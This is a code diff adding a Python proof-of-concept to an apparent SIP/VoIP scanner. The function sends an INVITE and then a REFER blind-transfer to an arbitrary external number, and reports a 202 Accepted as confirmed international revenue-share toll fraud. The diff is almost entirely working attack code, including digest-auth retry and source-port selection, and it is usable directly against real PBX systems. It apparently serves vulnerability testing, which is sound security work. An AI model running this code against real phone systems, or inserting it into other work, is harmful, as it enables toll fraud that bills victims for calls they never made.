@@ -867,6 +867,208 @@ def place_call(
 
 
 # ---------------------------------------------------------------------------
+# REFER blind-transfer toll-fraud PoC
+# ---------------------------------------------------------------------------
+
+def test_refer_blind_transfer(
+    host: str,
+    call_from: str,
+    refer_to_number: str,
+    *,
+    port: int = 5060,
+    username: str | None = None,
+    password: str | None = None,
+    timeout: float = 5.0,
+    traffic_log=None,
+    source_ip: str = "",
+    source_port_range: tuple[int, int] | None = None,
+    local_extension: str = "1000",
+) -> dict:
+    """Attempt a REFER blind-transfer to *refer_to_number* via *host*.
+
+    Sends an INVITE to *local_extension* to establish/attempt a dialog, then
+    immediately sends a REFER in the same dialog state with:
+      Refer-To: <sip:{refer_to_number}@{host}>
+      Referred-By: <sip:{call_from}@{host}>
+
+    Returns a dict with keys:
+      status_code  – final SIP response code to the REFER (int | None)
+      evidence     – human-readable summary string
+      is_vulnerable – True when 202 Accepted (IRSF toll-fraud confirmed)
+    """
+    local_ip = source_ip or local_ip_for(host)
+    try:
+        import ipaddress as _ip
+        bind_ip = "" if _ip.ip_address(local_ip).is_global else local_ip
+    except Exception:
+        bind_ip = local_ip
+
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    s.settimeout(timeout)
+
+    bound = False
+    if source_port_range:
+        lo, hi = source_port_range
+        for p in range(lo, hi + 1):
+            try:
+                s.bind((bind_ip, p))
+                bound = True
+                break
+            except OSError:
+                continue
+    if not bound:
+        try:
+            s.bind((bind_ip, 0))
+        except OSError:
+            s.bind(("", 0))
+    local_port = s.getsockname()[1]
+
+    call_id = rand_call_id()
+    tag_from = rand_tag()
+    invite_uri = f"sip:{local_extension}@{host}"
+
+    def _send(msg: bytes) -> None:
+        if traffic_log:
+            traffic_log.log("OUT", f"{host}:{port}", msg)
+        s.sendto(msg, (host, port))
+
+    def _recv() -> bytes | None:
+        try:
+            data, _ = s.recvfrom(65535)
+            if traffic_log:
+                traffic_log.log("IN", f"{host}:{port}", data)
+            return data
+        except socket.timeout:
+            return None
+
+    try:
+        invite = sip.build_message(
+            "INVITE", invite_uri,
+            from_user=call_from, to_user=local_extension,
+            host=host, port=port,
+            local_ip=local_ip, local_port=local_port,
+            call_id=call_id, cseq=1, from_tag=tag_from,
+        )
+        _send(invite)
+
+        last_to_tag: str | None = None
+        invite_resp: sip.SipResponse | None = None
+        deadline = time.monotonic() + timeout
+        auth_attempted = False
+
+        while time.monotonic() < deadline:
+            data = _recv()
+            if not data:
+                break
+            resp = sip.parse_response(data)
+            if not resp:
+                continue
+            to_hdr = resp.headers.get("to", "")
+            if ";tag=" in to_hdr:
+                last_to_tag = to_hdr.split(";tag=", 1)[1].split(";")[0].split(",")[0].strip()
+
+            if resp.status_code in (100, 180, 183):
+                invite_resp = resp
+                continue
+
+            if resp.is_auth_required and not auth_attempted:
+                if not (username and password):
+                    invite_resp = resp
+                    break
+                auth_attempted = True
+                try:
+                    ack_cseq = int(resp.headers.get("cseq", "1").split()[0])
+                except (ValueError, IndexError):
+                    ack_cseq = 1
+                hdr_name = "Proxy-Authorization" if resp.status_code == 407 else "Authorization"
+                auth_header = sip.build_auth_header(
+                    username, password, "INVITE", invite_uri,
+                    resp.auth_params, header_name=hdr_name,
+                )
+                ack = sip.build_message(
+                    "ACK", invite_uri,
+                    from_user=call_from, to_user=local_extension,
+                    host=host, port=port,
+                    local_ip=local_ip, local_port=local_port,
+                    call_id=call_id, cseq=ack_cseq, from_tag=tag_from,
+                    to_tag=last_to_tag,
+                )
+                _send(ack)
+                call_id = rand_call_id()
+                invite2 = sip.build_message(
+                    "INVITE", invite_uri,
+                    from_user=call_from, to_user=local_extension,
+                    host=host, port=port,
+                    local_ip=local_ip, local_port=local_port,
+                    call_id=call_id, cseq=1, from_tag=tag_from,
+                    auth_header=auth_header,
+                )
+                _send(invite2)
+                continue
+
+            invite_resp = resp
+            break
+
+        # Send REFER in the same dialog (even if INVITE was rejected / provisional)
+        refer_target = f"sip:{refer_to_number}@{host}"
+        refer_msg = sip.build_message(
+            "REFER", invite_uri,
+            from_user=call_from, to_user=local_extension,
+            host=host, port=port,
+            local_ip=local_ip, local_port=local_port,
+            call_id=call_id, cseq=2, from_tag=tag_from,
+            to_tag=last_to_tag,
+            extra_headers=[
+                f"Refer-To: <{refer_target}>",
+                f"Referred-By: <sip:{call_from}@{host}>",
+            ],
+        )
+        _send(refer_msg)
+
+        refer_resp: sip.SipResponse | None = None
+        deadline2 = time.monotonic() + timeout
+        while time.monotonic() < deadline2:
+            data = _recv()
+            if not data:
+                break
+            resp = sip.parse_response(data)
+            if not resp:
+                continue
+            refer_resp = resp
+            break
+
+    finally:
+        s.close()
+
+    if refer_resp is None:
+        return {
+            "status_code": None,
+            "evidence": "no response to REFER (timeout)",
+            "is_vulnerable": False,
+        }
+
+    code = refer_resp.status_code
+    if code == 202:
+        evidence = (
+            f"202 Accepted — REFER blind-transfer to {refer_to_number} accepted. "
+            "IRSF toll-fraud via REFER confirmed."
+        )
+        is_vulnerable = True
+    elif code == 403:
+        evidence = "403 Forbidden — REFER filtering is in place."
+        is_vulnerable = False
+    else:
+        evidence = f"{code} {refer_resp.reason} — REFER not accepted."
+        is_vulnerable = False
+
+    return {
+        "status_code": code,
+        "evidence": evidence,
+        "is_vulnerable": is_vulnerable,
+    }
+
+
+# ---------------------------------------------------------------------------
 # Dial-plan prefix discovery
 # ---------------------------------------------------------------------------
 
